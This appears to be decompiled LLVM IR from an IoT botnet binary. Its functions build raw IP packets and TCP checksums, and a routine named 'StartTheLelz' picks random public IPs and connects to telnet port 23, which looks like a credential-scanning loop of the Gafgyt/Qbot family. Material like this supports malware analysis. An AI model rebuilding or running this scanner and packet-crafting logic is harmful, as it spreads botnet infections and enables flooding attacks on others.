  br i1 %v1_804a07f, label %dec_label_pc_804a049, label %dec_label_pc_804a06e.dec_label_pc_804a081_crit_edge

dec_label_pc_804a06e.dec_label_pc_804a081_crit_edge: ; preds = %dec_label_pc_804a049
  br label %dec_label_pc_804a081

dec_label_pc_804a081:                             ; preds = %dec_label_pc_804a06e.dec_label_pc_804a081_crit_edge, %dec_label_pc_804a06e.preheader
  %v4_804a06e.lcssa = phi i32 [ %v4_804a06e, %dec_label_pc_804a06e.dec_label_pc_804a081_crit_edge ], [ %v4_804a06e20, %dec_label_pc_804a06e.preheader ]
  %v1_804a085 = urem i32 %v4_804a06e.lcssa, 65536
  %v1_804a087 = xor i32 %v1_804a085, 65535
  store i32 %v0_8049ff8, i32* @ebx, align 4
  ret i32 %v1_804a087

; uselistorder directives
  uselistorder i32 %v5_804a074, { 1, 0 }
  uselistorder i32 %v4_804a06e, { 1, 0, 2 }
  uselistorder i32 %v2_804a07825, { 1, 0 }
  uselistorder i32 %v4_804a07121, { 1, 0 }
  uselistorder i32 %v4_804a06e20, { 2, 1, 0 }
  uselistorder i32 %v4_804a041, { 1, 0 }
  uselistorder i16 %stack_var_-24.0.lcssa, { 1, 0 }
  uselistorder i16 %v3_804a019.lcssa, { 1, 0 }
  uselistorder i32 %v4_804a027, { 1, 0 }
  uselistorder i32 %v4_804a023, { 0, 2, 1 }
  uselistorder i32 %v6_804a019, { 1, 2, 0 }
  uselistorder i32 %v4_804a019, { 1, 0 }
  uselistorder label %dec_label_pc_804a049, { 1, 0 }
  uselistorder label %dec_label_pc_804a00c, { 1, 0 }
}

define i32 @tcpcsum() local_unnamed_addr {
entry:
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  %tmp10 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4 = alloca i32, align 4
  %v0_804a092 = load i32, i32* @ebp, align 4
  store i32 %v0_804a092, i32* %stack_var_-4, align 4
  %v4_804a092 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v4_804a092, i32* @ebp, align 4
  %v1_804a0a6 = add i32 %tmp10, 12
  %v2_804a0a6 = inttoptr i32 %v1_804a0a6 to i32*
  %v3_804a0a6 = load i32, i32* %v2_804a0a6, align 4
  %v1_804a0af = add i32 %tmp10, 16
  %v2_804a0af = inttoptr i32 %v1_804a0af to i32*
  %v3_804a0af = load i32, i32* %v2_804a0af, align 4
  %v2_804a0c4 = call i32 @htons(i16 20)
  %v1_804a0dd = call i32 @malloc(i32 32)
  store i32 %v1_804a0dd, i32* %ecx.global-to-local, align 4
  %v2_804a0ed = inttoptr i32 %v1_804a0dd to i32*
  store i32 %v3_804a0a6, i32* %v2_804a0ed, align 4
  %v1_804a0f2 = load i32, i32* %ecx.global-to-local, align 4
  %v2_804a0f2 = add i32 %v1_804a0f2, 4
  %v3_804a0f2 = inttoptr i32 %v2_804a0f2 to i32*
  store i32 %v3_804a0af, i32* %v3_804a0f2, align 4
  %v1_804a0f8 = load i32, i32* %ecx.global-to-local, align 4
  %v2_804a0f8 = add i32 %v1_804a0f8, 8
  %v3_804a0f8 = inttoptr i32 %v2_804a0f8 to i32*
  store i32 0, i32* %v3_804a0f8, align 4
  store i32 %tmp2, i32* %ecx.global-to-local, align 4
  %v1_804a101 = add i32 %v1_804a0dd, 12
  store i32 %v1_804a101, i32* %edx.global-to-local, align 4
  %v1_804a104 = inttoptr i32 %tmp2 to i32*
  %v2_804a104 = load i32, i32* %v1_804a104, align 4
  %v2_804a106 = inttoptr i32 %v1_804a101 to i32*
  store i32 %v2_804a104, i32* %v2_804a106, align 4
  %v0_804a108 = load i32, i32* %ecx.global-to-local, align 4
  %v1_804a108 = add i32 %v0_804a108, 4
  %v2_804a108 = inttoptr i32 %v1_804a108 to i32*
  %v3_804a108 = load i32, i32* %v2_804a108, align 4
  %v1_804a10b = load i32, i32* %edx.global-to-local, align 4
  %v2_804a10b = add i32 %v1_804a10b, 4
  %v3_804a10b = inttoptr i32 %v2_804a10b to i32*
  store i32 %v3_804a108, i32* %v3_804a10b, align 4
  %v0_804a10e = load i32, i32* %ecx.global-to-local, align 4
  %v1_804a10e = add i32 %v0_804a10e, 8
  %v2_804a10e = inttoptr i32 %v1_804a10e to i32*
  %v3_804a10e = load i32, i32* %v2_804a10e, align 4
  %v1_804a111 = load i32, i32* %edx.global-to-local, align 4
  %v2_804a111 = add i32 %v1_804a111, 8
  %v3_804a111 = inttoptr i32 %v2_804a111 to i32*
  store i32 %v3_804a10e, i32* %v3_804a111, align 4
  %v0_804a114 = load i32, i32* %ecx.global-to-local, align 4
  %v1_804a114 = add i32 %v0_804a114, 12
  %v2_804a114 = inttoptr i32 %v1_804a114 to i32*
  %v3_804a114 = load i32, i32* %v2_804a114, align 4
  %v1_804a117 = load i32, i32* %edx.global-to-local, align 4
  %v2_804a117 = add i32 %v1_804a117, 12
  %v3_804a117 = inttoptr i32 %v2_804a117 to i32*
  store i32 %v3_804a114, i32* %v3_804a117, align 4
  %v0_804a11a = load i32, i32* %ecx.global-to-local, align 4
  %v1_804a11a = add i32 %v0_804a11a, 16
  %v2_804a11a = inttoptr i32 %v1_804a11a to i32*
  %v3_804a11a = load i32, i32* %v2_804a11a, align 4
  %v1_804a11d = load i32, i32* %edx.global-to-local, align 4
  %v2_804a11d = add i32 %v1_804a11d, 16
  %v3_804a11d = inttoptr i32 %v2_804a11d to i32*
  store i32 %v3_804a11a, i32* %v3_804a11d, align 4
  %v2_804a12d = inttoptr i32 %v1_804a0dd to i16*
  %v3_804a12d = call i32 @csum(i16* %v2_804a12d, i32 32)
  %v1_804a132 = urem i32 %v3_804a12d, 65536
  %v1_804a13f = call i32 @free(i32 %v1_804a0dd)
  %v2_804a148 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804a148, i32* @ebp, align 4
  ret i32 %v1_804a132

; uselistorder directives
  uselistorder i32 %v1_804a0dd, { 2, 1, 0, 3, 4 }
  uselistorder i32* %stack_var_-4, { 0, 2, 1 }
  uselistorder i32 %tmp10, { 1, 0 }
  uselistorder i32 %tmp2, { 1, 0 }
}

define i32 @makeIPPacket() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp5 = call i32 @__decompiler_undefined_function_0()
  %tmp6 = call i8* @__decompiler_undefined_function_2()
  %tmp8 = call i8 @__decompiler_undefined_function_3()
  %stack_var_-4 = alloca i32, align 4
  %v0_804a14a = load i32, i32* @ebp, align 4
  store i32 %v0_804a14a, i32* %stack_var_-4, align 4
  %v4_804a150 = sext i8 %tmp8 to i32
  %v4_804a156 = ptrtoint i8* %tmp6 to i32
  store i8 69, i8* %tmp6, align 1
  %v1_804a171 = add i32 %v4_804a156, 1
  %v2_804a171 = inttoptr i32 %v1_804a171 to i8*
  store i8 0, i8* %v2_804a171, align 1
  %v1_804a17b = add i32 %tmp5, 20
  %v1_804a184 = trunc i32 %v1_804a17b to i16
  %v3_804a184 = add i32 %v4_804a156, 2
  %v4_804a184 = inttoptr i32 %v3_804a184 to i16*
  store i16 %v1_804a184, i16* %v4_804a184, align 2
  %v2_804a188 = call i32 @rand_cmwc(i32 %v4_804a150)
  %v1_804a193 = trunc i32 %v2_804a188 to i16
  %v3_804a193 = add i32 %v4_804a156, 4
  %v4_804a193 = inttoptr i32 %v3_804a193 to i16*
  store i16 %v1_804a193, i16* %v4_804a193, align 2
  %v1_804a19a = add i32 %v4_804a156, 6
  %v2_804a19a = inttoptr i32 %v1_804a19a to i16*
  store i16 0, i16* %v2_804a19a, align 2
  %v1_804a1a3 = add i32 %v4_804a156, 8
  %v2_804a1a3 = inttoptr i32 %v1_804a1a3 to i8*
  store i8 -1, i8* %v2_804a1a3, align 1
  %v3_804a1ae = add i32 %v4_804a156, 9
  %v4_804a1ae = inttoptr i32 %v3_804a1ae to i8*
  store i8 %tmp8, i8* %v4_804a1ae, align 1
  %v1_804a1b4 = add i32 %v4_804a156, 10
  %v2_804a1b4 = inttoptr i32 %v1_804a1b4 to i16*
  store i16 0, i16* %v2_804a1b4, align 2
  %v2_804a1c0 = add i32 %v4_804a156, 12
  %v3_804a1c0 = inttoptr i32 %v2_804a1c0 to i32*
  %v2_804a1c9 = add i32 %v4_804a156, 16
  %v3_804a1c9 = inttoptr i32 %v2_804a1c9 to i32*
  store i32 %tmp, i32* %v3_804a1c9, align 4
  %v2_804a1cc = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804a1cc, i32* @ebp, align 4
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i8 -1, { 4, 0, 1, 3, 2 }
}

define i32 @sclose(i32 %arg1) local_unnamed_addr {
entry:
  %v4_804a1d4 = add i32 %arg1, -2
  %v9_804a1d4 = sub i32 1, %arg1
  %v10_804a1d4 = and i32 %v9_804a1d4, %arg1
  %v11_804a1d4 = icmp slt i32 %v10_804a1d4, 0
  %v12_804a1d4 = icmp eq i32 %v4_804a1d4, 0
  %v13_804a1d4 = icmp slt i32 %v4_804a1d4, 0
  %v3_804a1d8 = icmp eq i1 %v13_804a1d4, %v11_804a1d4
  %v4_804a1d8 = icmp eq i1 %v12_804a1d4, false
  %v5_804a1d8 = and i1 %v4_804a1d8, %v3_804a1d8
  br i1 %v5_804a1d8, label %dec_label_pc_804a1e3, label %dec_label_pc_804a1f5

dec_label_pc_804a1e3:                             ; preds = %entry
  %v1_804a1e9 = call i32 @__libc_close(i32 %arg1)
  br label %dec_label_pc_804a1f5

dec_label_pc_804a1f5:                             ; preds = %entry, %dec_label_pc_804a1e3
  %storemerge = phi i32 [ 0, %dec_label_pc_804a1e3 ], [ 1, %entry ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v4_804a1d4, { 1, 0 }
  uselistorder i32 %arg1, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_804a1f5, { 1, 0 }
}

define i32 @socket_connect(i32 %arg1, i16 %arg2) local_unnamed_addr {
entry:
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804a1fa = load i32, i32* @ebp, align 4
  store i32 %v0_804a1fa, i32* %stack_var_-4, align 4
  %v4_804a1fa = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v4_804a1fa, i32* @ebp, align 4
  store i32 1, i32* %stack_var_-32, align 4
  %v1_804a214 = call i32 @__GI_gethostbyname(i32 %arg1)
  %v4_804a21c = icmp eq i32 %v1_804a214, 0
  %v1_804a220 = icmp eq i1 %v4_804a21c, false
  br i1 %v1_804a220, label %dec_label_pc_804a22e, label %dec_label_pc_804a2f3

dec_label_pc_804a22e:                             ; preds = %entry
  %v1_804a231 = add i32 %v1_804a214, 12
  %v2_804a231 = inttoptr i32 %v1_804a231 to i32*
  %v3_804a231 = load i32, i32* %v2_804a231, align 4
  %v1_804a239 = add i32 %v1_804a214, 16
  %v2_804a239 = inttoptr i32 %v1_804a239 to i32*
  %v3_804a239 = load i32, i32* %v2_804a239, align 4
  %v1_804a23c = inttoptr i32 %v3_804a239 to i32*
  %v2_804a23c = load i32, i32* %v1_804a23c, align 4
  %v15_804a245 = ptrtoint i32* %stack_var_-24 to i32
  %v3_804a24f = call i32 @bcopy(i32 %v2_804a23c, i32 %v15_804a245, i32 %v3_804a231)
  %v2_804a25b = call i32 @htons(i16 %arg2)
  store i32 2, i32* %stack_var_-28, align 4
  %v3_804a284 = call i32 @socket(i32 2, i32 1, i32 6)
  %v2_804a28c = ptrtoint i32* %stack_var_-32 to i32
  %v5_804a2b1 = call i32 @__GI_setsockopt(i32 %v3_804a284, i32 6, i32 1, i32 %v2_804a28c, i32 4)
  %v13_804a2b6 = icmp eq i32 %v3_804a284, -1
  %v1_804a2ba = icmp eq i1 %v13_804a2b6, false
  br i1 %v1_804a2ba, label %dec_label_pc_804a2c5, label %dec_label_pc_804a2f3

dec_label_pc_804a2c5:                             ; preds = %dec_label_pc_804a22e
  %v2_804a242 = ptrtoint i32* %stack_var_-28 to i32
  %v3_804a2da = call i32 @__libc_connect(i32 %v3_804a284, i32 %v2_804a242, i32 16)
  %v10_804a2df = icmp eq i32 %v3_804a2da, -1
  %v1_804a2e2 = icmp eq i1 %v10_804a2df, false
  br i1 %v1_804a2e2, label %dec_label_pc_804a2ed, label %dec_label_pc_804a2f3

dec_label_pc_804a2ed:                             ; preds = %dec_label_pc_804a2c5
  br label %dec_label_pc_804a2f3

dec_label_pc_804a2f3:                             ; preds = %dec_label_pc_804a2c5, %dec_label_pc_804a22e, %entry, %dec_label_pc_804a2ed
  %stack_var_-44.0 = phi i32 [ %v3_804a284, %dec_label_pc_804a2ed ], [ 0, %entry ], [ 0, %dec_label_pc_804a22e ], [ 0, %dec_label_pc_804a2c5 ]
  %v2_804a2f6 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804a2f6, i32* @ebp, align 4
  ret i32 %stack_var_-44.0

; uselistorder directives
  uselistorder i32 %v3_804a284, { 1, 2, 0, 3 }
  uselistorder i32* %stack_var_-4, { 0, 2, 1 }
  uselistorder i32* %stack_var_-28, { 1, 0 }
  uselistorder i32* %stack_var_-32, { 1, 0 }
  uselistorder label %dec_label_pc_804a2f3, { 3, 0, 1, 2 }
}

define i32 @StartTheLelz(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-332 = alloca i32, align 4
  %stack_var_-328 = alloca i32, align 4
  %stack_var_-324 = alloca i32, align 4
  %stack_var_-316 = alloca i32, align 4
  %stack_var_-596 = alloca i32, align 4
  %stack_var_-604 = alloca i32, align 4
  store i32 %arg2, i32* %eax.global-to-local, align 4
  %v2_804a311 = call i32 @__GI_time(i32* null)
  store i32 %v2_804a311, i32* %eax.global-to-local, align 4
  store i32 %v2_804a311, i32* @ebx, align 4
  %v1_804a318 = call i32 @rand_cmwc(i32 0)
  %v1_804a31d = load i32, i32* @ebx, align 4
  %v2_804a31d = xor i32 %v1_804a31d, %v1_804a318
  store i32 %v2_804a31d, i32* @eax, align 4
  %v1_804a322 = call i32 @srand(i32 %v2_804a31d)
  store i32 %v1_804a322, i32* %eax.global-to-local, align 4
  store i32 2, i32* %stack_var_-604, align 4
  %v2_804a337 = call i32 @htons(i16 23)
  %v2_804a346 = ptrtoint i32* %stack_var_-604 to i32
  %v15_804a34c = ptrtoint i32* %stack_var_-596 to i32
  store i32 %v15_804a34c, i32* %eax.global-to-local, align 4
  store i32 0, i32* %stack_var_-596, align 4
  %v1_804a363 = call i32 @malloc(i32 1025)
  store i32 %v1_804a363, i32* %edx.global-to-local, align 4
  store i32 1025, i32* %eax.global-to-local, align 4
  %v3_804a384 = inttoptr i32 %v1_804a363 to i8*
  %v4_804a384 = call i32 @__GI_memset(i8* %v3_804a384, i32 0, i32 1025)
  %v2_804a39a = mul i32 %arg2, 28
  %v1_804a39f = add i32 %v2_804a39a, 30
  %v2_804a3a2 = and i32 %v1_804a39f, -16
  %v0_804a3a8 = load i32, i32* @esp, align 4
  %v2_804a3a8 = sub i32 %v0_804a3a8, %v2_804a3a2
  %v1_804a3ba = add i32 %v2_804a3a8, 35
  %v2_804a3bd = and i32 %v1_804a3ba, -16
  %v2_804a3da = mul i32 %arg2, 5
  store i32 %v2_804a3da, i32* %edx.global-to-local, align 4
  %v1_804a3e0 = inttoptr i32 %v2_804a3bd to i8*
  store i32 %v2_804a3bd, i32* @edi, align 4
  %v1_804a3e5 = and i32 %v1_804a3ba, -256
  store i32 %v1_804a3e5, i32* %eax.global-to-local, align 4
  %v5_804a3e7 = call i8* @_memset(i8* %v1_804a3e0, i32 %v1_804a3e5, i32 %v2_804a3da)
  store i32 0, i32* %eax.global-to-local, align 4
  %v5_804a47458 = icmp sgt i32 %arg2, 0
  br i1 %v5_804a47458, label %dec_label_pc_804a3f2.lr.ph, label %dec_label_pc_804a481

dec_label_pc_804a3f2.lr.ph:                       ; preds = %entry
  %v2_804a446 = or i32 %v2_804a3bd, 9
  br label %dec_label_pc_804a3f2

dec_label_pc_804a3f2:                             ; preds = %dec_label_pc_804a3f2, %dec_label_pc_804a3f2.lr.ph
  %storemerge259 = phi i32 [ 0, %dec_label_pc_804a3f2.lr.ph ], [ %v4_804a46b, %dec_label_pc_804a3f2 ]
  %v2_804a406 = mul i32 %storemerge259, 28
  %v2_804a408 = add i32 %v2_804a406, %v2_804a3bd
  store i32 %v2_804a408, i32* %eax.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v2_804a410 = inttoptr i32 %v2_804a408 to i32*
  store i32 0, i32* %v2_804a410, align 4
  %v0_804a412 = load i32, i32* %eax.global-to-local, align 4
  %v1_804a412 = add i32 %v0_804a412, 4
  store i32 %v1_804a412, i32* %eax.global-to-local, align 4
  %v0_804a415 = load i32, i32* %edx.global-to-local, align 4
  %v2_804a415 = inttoptr i32 %v1_804a412 to i32*
  store i32 %v0_804a415, i32* %v2_804a415, align 4
  %v0_804a417 = load i32, i32* %eax.global-to-local, align 4
  %v1_804a417 = add i32 %v0_804a417, 4
  store i32 %v1_804a417, i32* %eax.global-to-local, align 4
  %v0_804a41a = load i32, i32* %edx.global-to-local, align 4
  %v2_804a41a = inttoptr i32 %v1_804a417 to i32*
  store i32 %v0_804a41a, i32* %v2_804a41a, align 4
  %v0_804a41c = load i32, i32* %eax.global-to-local, align 4
  %v1_804a41c = add i32 %v0_804a41c, 4
  store i32 %v1_804a41c, i32* %eax.global-to-local, align 4
  %v0_804a41f = load i32, i32* %edx.global-to-local, align 4
  %v2_804a41f = inttoptr i32 %v1_804a41c to i32*
  store i32 %v0_804a41f, i32* %v2_804a41f, align 4
  %v0_804a421 = load i32, i32* %eax.global-to-local, align 4
  %v1_804a421 = add i32 %v0_804a421, 4
  store i32 %v1_804a421, i32* %eax.global-to-local, align 4
  %v0_804a424 = load i32, i32* %edx.global-to-local, align 4
  %v2_804a424 = inttoptr i32 %v1_804a421 to i32*
  store i32 %v0_804a424, i32* %v2_804a424, align 4
  %v0_804a426 = load i32, i32* %eax.global-to-local, align 4
  %v1_804a426 = add i32 %v0_804a426, 4
  store i32 %v1_804a426, i32* %eax.global-to-local, align 4
  %v0_804a429 = load i32, i32* %edx.global-to-local, align 4
  %v2_804a429 = inttoptr i32 %v1_804a426 to i32*
  store i32 %v0_804a429, i32* %v2_804a429, align 4
  %v0_804a42b = load i32, i32* %eax.global-to-local, align 4
  %v1_804a42b = add i32 %v0_804a42b, 4
  %v0_804a42e = load i32, i32* %edx.global-to-local, align 4
  %v2_804a42e = inttoptr i32 %v1_804a42b to i32*
  store i32 %v0_804a42e, i32* %v2_804a42e, align 4
  %v3_804a446 = add i32 %v2_804a446, %v2_804a406
  %v4_804a446 = inttoptr i32 %v3_804a446 to i8*
  store i8 1, i8* %v4_804a446, align 1
  %v1_804a463 = add i32 %v2_804a408, 24
  store i32 %v1_804a463, i32* %edx.global-to-local, align 4
  %v2_804a469 = inttoptr i32 %v1_804a463 to i32*
  store i32 %v1_804a363, i32* %v2_804a469, align 4
  %v4_804a46b = add nuw nsw i32 %storemerge259, 1
  store i32 %v4_804a46b, i32* %eax.global-to-local, align 4
  %exitcond60 = icmp eq i32 %v4_804a46b, %arg2
  br i1 %exitcond60, label %dec_label_pc_804a481, label %dec_label_pc_804a3f2

dec_label_pc_804a481:                             ; preds = %entry, %dec_label_pc_804a3f2, %dec_label_pc_804a481
  %stack_var_-48.0 = phi i32 [ %v4_804a481, %dec_label_pc_804a481 ], [ 0, %dec_label_pc_804a3f2 ], [ 0, %entry ]
  %v4_804a481 = add i32 %stack_var_-48.0, 1
  store i32 %v4_804a481, i32* %eax.global-to-local, align 4
  %v1_804a487 = mul i32 %v4_804a481, 4
  %v2_804a487 = add i32 %v1_804a487, ptrtoint ([10 x i8*]* @global_var_805a380.52 to i32)
  %v3_804a487 = inttoptr i32 %v2_804a487 to i32*
  %v4_804a487 = load i32, i32* %v3_804a487, align 4
  store i32 %v4_804a487, i32* %eax.global-to-local, align 4
  %v1_804a48e = icmp eq i32 %v4_804a487, 0
  %v1_804a490 = icmp eq i1 %v1_804a48e, false
  br i1 %v1_804a490, label %dec_label_pc_804a481, label %dec_label_pc_804a492.preheader

dec_label_pc_804a492.preheader:                   ; preds = %dec_label_pc_804a481
  %v2_804a864 = ptrtoint i32* %stack_var_-316 to i32
  %tmp37 = bitcast i32* %stack_var_-316 to i8*
  %v2_804a8e4 = ptrtoint i32* %stack_var_-324 to i32
  %v2_804a94a = ptrtoint i32* %stack_var_-328 to i32
  %v2_804a954 = ptrtoint i32* %stack_var_-332 to i32
  %v2_804a502 = or i32 %v2_804a3bd, 8
  %v2_804a542 = or i32 %v2_804a3bd, 9
  %v2_804a633 = or i32 %v2_804a3bd, 11
  %v2_804a67a = or i32 %v2_804a3bd, 10
  %v2_804b06d = add i32 %v2_804a3bd, 16
  br label %dec_label_pc_804a492

dec_label_pc_804a492:                             ; preds = %dec_label_pc_804a492, %dec_label_pc_804b3f0, %dec_label_pc_804a492.preheader
  %stack_var_-624.0 = phi i32 [ %tmp4, %dec_label_pc_804a492.preheader ], [ %stack_var_-624.0, %dec_label_pc_804a492 ], [ %stack_var_-624.1, %dec_label_pc_804b3f0 ]
  %stack_var_-628.0 = phi i32 [ %tmp3, %dec_label_pc_804a492.preheader ], [ %stack_var_-628.0, %dec_label_pc_804a492 ], [ %stack_var_-628.1, %dec_label_pc_804b3f0 ]
  store i32 0, i32* %eax.global-to-local, align 4
  br i1 %v5_804a47458, label %dec_label_pc_804a49e, label %dec_label_pc_804a492

dec_label_pc_804a49e:                             ; preds = %dec_label_pc_804a492, %dec_label_pc_804b3f0
  %storemerge49 = phi i32 [ %v4_804b3f0, %dec_label_pc_804b3f0 ], [ 0, %dec_label_pc_804a492 ]
  %stack_var_-628.248 = phi i32 [ %stack_var_-628.1, %dec_label_pc_804b3f0 ], [ %stack_var_-628.0, %dec_label_pc_804a492 ]
  %stack_var_-624.247 = phi i32 [ %stack_var_-624.1, %dec_label_pc_804b3f0 ], [ %stack_var_-624.0, %dec_label_pc_804a492 ]
  %v1_804a4a4 = mul i32 %storemerge49, 4
  store i32 %v1_804a4a4, i32* %edx.global-to-local, align 4
  %v2_804a4b2 = mul i32 %storemerge49, 28
  %v2_804a4b4 = add i32 %v2_804a4b2, %v2_804a3bd
  %v1_804a4b6 = add i32 %v2_804a4b4, 16
  store i32 %v1_804a4b6, i32* %eax.global-to-local, align 4
  %v1_804a4b9 = inttoptr i32 %v1_804a4b6 to i32*
  %v2_804a4b9 = load i32, i32* %v1_804a4b9, align 4
  store i32 %v2_804a4b9, i32* %eax.global-to-local, align 4
  %v1_804a4bb = icmp eq i32 %v2_804a4b9, 0
  %v1_804a4bd = icmp eq i1 %v1_804a4bb, false
  br i1 %v1_804a4bd, label %dec_label_pc_804a4ec, label %dec_label_pc_804a4bf

dec_label_pc_804a4bf:                             ; preds = %dec_label_pc_804a49e
  store i32 %storemerge49, i32* @ebx, align 4
  %v0_804a4c2 = load i32, i32* @esp, align 4
  %v1_804a4c2 = inttoptr i32 %v0_804a4c2 to i32*
  store i32 0, i32* %v1_804a4c2, align 4
  %v1_804a4c9 = inttoptr i32 %storemerge49 to i32*
  %v2_804a4c9 = call i32 @__GI_time(i32* %v1_804a4c9)
  store i32 %v2_804a4c9, i32* @esi, align 4
  %v0_804a4d3 = load i32, i32* @ebx, align 4
  %v1_804a4d5 = mul i32 %v0_804a4d3, 4
  store i32 %v1_804a4d5, i32* %edx.global-to-local, align 4
  %v2_804a4e3 = mul i32 %v0_804a4d3, 28
  %v2_804a4e5 = add i32 %v2_804a4e3, %v2_804a3bd
  %v1_804a4e7 = add i32 %v2_804a4e5, 16
  store i32 %v1_804a4e7, i32* %eax.global-to-local, align 4
  %v2_804a4ea = inttoptr i32 %v1_804a4e7 to i32*
  store i32 %v2_804a4c9, i32* %v2_804a4ea, align 4
  br label %dec_label_pc_804a4ec

dec_label_pc_804a4ec:                             ; preds = %dec_label_pc_804a49e, %dec_label_pc_804a4bf
  store i32 %v1_804a4a4, i32* %edx.global-to-local, align 4
  store i32 %v2_804a4b2, i32* %eax.global-to-local, align 4
  %v3_804a502 = add i32 %v2_804a502, %v2_804a4b2
  %v4_804a502 = inttoptr i32 %v3_804a502 to i8*
  %v5_804a502 = load i8, i8* %v4_804a502, align 4
  %v6_804a502 = zext i8 %v5_804a502 to i32
  store i32 %v6_804a502, i32* %eax.global-to-local, align 4
  store i32 %v6_804a502, i32* @edi, align 4
  %v1_804a523 = mul nuw nsw i32 %v6_804a502, 4
  %v2_804a523 = add nuw nsw i32 %v1_804a523, 134571880
  %v3_804a523 = inttoptr i32 %v2_804a523 to i32*
  %v4_804a523 = load i32, i32* %v3_804a523, align 4
  store i32 %v4_804a523, i32* %eax.global-to-local, align 4
  switch i8 %v5_804a502, label %dec_label_pc_804b3f0 [
    i8 0, label %dec_label_pc_804a52c
    i8 1, label %dec_label_pc_804a85a
    i8 2, label %dec_label_pc_804aac0
    i8 3, label %dec_label_pc_804ac00
    i8 4, label %dec_label_pc_804ad53
    i8 5, label %dec_label_pc_804ae93
    i8 6, label %dec_label_pc_804afe6
    i8 7, label %dec_label_pc_804b280
  ]

dec_label_pc_804a52c:                             ; preds = %dec_label_pc_804a4ec
  store i32 %v1_804a4a4, i32* %edx.global-to-local, align 4
  store i32 %v2_804a4b2, i32* %eax.global-to-local, align 4
  %v3_804a542 = add i32 %v2_804a542, %v2_804a4b2
  %v4_804a542 = inttoptr i32 %v3_804a542 to i8*
  %v5_804a542 = load i8, i8* %v4_804a542, align 1
  %v10_804a547 = icmp eq i8 %v5_804a542, 1
  %v1_804a549 = icmp eq i1 %v10_804a547, false
  store i32 %v1_804a4a4, i32* %edx.global-to-local, align 4
  store i32 %v2_804a4b2, i32* %eax.global-to-local, align 4
  br i1 %v1_804a549, label %dec_label_pc_804a5f8, label %dec_label_pc_804a54f

dec_label_pc_804a54f:                             ; preds = %dec_label_pc_804a52c
  %v1_804a567 = add i32 %v2_804a4b4, 24
  store i32 %v1_804a567, i32* %eax.global-to-local, align 4
  %v1_804a56a = inttoptr i32 %v1_804a567 to i32*
  %v2_804a56a = load i32, i32* %v1_804a56a, align 4
  store i32 %v2_804a4b4, i32* %eax.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v2_804a58d = inttoptr i32 %v2_804a4b4 to i32*
  store i32 0, i32* %v2_804a58d, align 4
  %v0_804a58f = load i32, i32* %eax.global-to-local, align 4
  %v1_804a58f = add i32 %v0_804a58f, 4
  store i32 %v1_804a58f, i32* %eax.global-to-local, align 4
  %v0_804a592 = load i32, i32* %edx.global-to-local, align 4
  %v2_804a592 = inttoptr i32 %v1_804a58f to i32*
  store i32 %v0_804a592, i32* %v2_804a592, align 4
  %v0_804a594 = load i32, i32* %eax.global-to-local, align 4
  %v1_804a594 = add i32 %v0_804a594, 4
  store i32 %v1_804a594, i32* %eax.global-to-local, align 4
  %v0_804a597 = load i32, i32* %edx.global-to-local, align 4
  %v2_804a597 = inttoptr i32 %v1_804a594 to i32*
  store i32 %v0_804a597, i32* %v2_804a597, align 4
  %v0_804a599 = load i32, i32* %eax.global-to-local, align 4
  %v1_804a599 = add i32 %v0_804a599, 4
  store i32 %v1_804a599, i32* %eax.global-to-local, align 4
  %v0_804a59c = load i32, i32* %edx.global-to-local, align 4
  %v2_804a59c = inttoptr i32 %v1_804a599 to i32*
  store i32 %v0_804a59c, i32* %v2_804a59c, align 4
  %v0_804a59e = load i32, i32* %eax.global-to-local, align 4
  %v1_804a59e = add i32 %v0_804a59e, 4
  store i32 %v1_804a59e, i32* %eax.global-to-local, align 4
  %v0_804a5a1 = load i32, i32* %edx.global-to-local, align 4
  %v2_804a5a1 = inttoptr i32 %v1_804a59e to i32*
  store i32 %v0_804a5a1, i32* %v2_804a5a1, align 4
  %v0_804a5a3 = load i32, i32* %eax.global-to-local, align 4
  %v1_804a5a3 = add i32 %v0_804a5a3, 4
  store i32 %v1_804a5a3, i32* %eax.global-to-local, align 4
  %v0_804a5a6 = load i32, i32* %edx.global-to-local, align 4
  %v2_804a5a6 = inttoptr i32 %v1_804a5a3 to i32*
  store i32 %v0_804a5a6, i32* %v2_804a5a6, align 4
  %v0_804a5a8 = load i32, i32* %eax.global-to-local, align 4
  %v1_804a5a8 = add i32 %v0_804a5a8, 4
  %v0_804a5ab = load i32, i32* %edx.global-to-local, align 4
  %v2_804a5ab = inttoptr i32 %v1_804a5a8 to i32*
  store i32 %v0_804a5ab, i32* %v2_804a5ab, align 4
  store i32 %v1_804a567, i32* %edx.global-to-local, align 4
  store i32 %v2_804a56a, i32* @eax, align 4
  store i32 %v2_804a56a, i32* %v1_804a56a, align 4
  store i32 %storemerge49, i32* @ebx, align 4
  %v1_804a5d0 = call i32 @GetRandomPublicIP(i32 %v6_804a502)
  %v0_804a5da = load i32, i32* @ebx, align 4
  %v1_804a5dc = mul i32 %v0_804a5da, 4
  store i32 %v1_804a5dc, i32* %edx.global-to-local, align 4
  %v2_804a5ea = mul i32 %v0_804a5da, 28
  %v2_804a5ec = add i32 %v2_804a5ea, %v2_804a3bd
  %v1_804a5ee = add i32 %v2_804a5ec, 4
  store i32 %v1_804a5ee, i32* %eax.global-to-local, align 4
  %v2_804a5f1 = inttoptr i32 %v1_804a5ee to i32*
  store i32 %v1_804a5d0, i32* %v2_804a5f1, align 4
  br label %dec_label_pc_804a6a9

